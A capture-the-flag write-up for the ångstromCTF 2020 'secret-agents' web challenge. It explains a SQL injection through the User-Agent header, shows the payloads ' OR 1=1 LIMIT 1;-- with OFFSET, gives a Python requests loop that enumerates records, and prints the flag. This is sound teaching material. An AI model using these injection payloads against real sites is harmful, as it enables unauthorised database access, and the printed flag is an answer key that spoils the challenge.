# secret-agents
Web, 110

> Can you enter the secret agent portal? I've heard someone has a flag :eyes:

> Our insider leaked the source, but was "terminated" shortly thereafter...

> Linked: https://agents.2020.chall.actf.co, app.p<span></span>y

For a while this kept going down due to pool exhaustion, but I removed it and it stabilised.

There seem to be a lot of commented code ~~from my attempts at a rate-limit hotfix~~, but the main issue we see is here:
```python
for r in cursor.execute("SELECT * FROM Agents WHERE UA='%s'"%(u), multi=True):
```
under the `/login` function.

The sql statement is vulnerable to injections!
Tracing where `u` is from, we find:
```python
u = request.headers.get("User-Agent")
```

So, this seems like an injection via the User-Agent. Simple enough. One thing to keep in mind is that we can only select 1 agent at a time, due to this line:
```python
if len(res) > 1:
```

You can use whatever interface you want to set the User-Agent, but I used Python + requests.

Anyway, we set our User-Agent header to `' OR 1=1;-- ` (mind the space).

However, this triggers the previously mentioned line of code, and we are faced with:
`hey! close, but no bananananananananana!!!! (there are many secret agents of course)`

So, we look into ways to limit it. Of course, MySQL has a `LIMIT`, so we implement it.
Our User-Agent now looks like `' OR 1=1 LIMIT 1;-- `.

Now, we can see that we're logged in as GRU (from Despicable Me). The only logical way to proceed now is to iterate through all the users, using something like Python:
```python
import requests

i=0
while True:
    p = requests.get("https://agents.2020.chall.actf.co/login", headers={
        "User-Agent": f"' OR 1=1 LIMIT 1 OFFSET {i};-- "
    })

    if "actf" in p.text:
        print(p.text)
        break

    i += 1;
```

Note that the `OFFSET` keyword is used to get the `i`th agent.

Flag: `actf{nyoom_1_4m_sp33d}`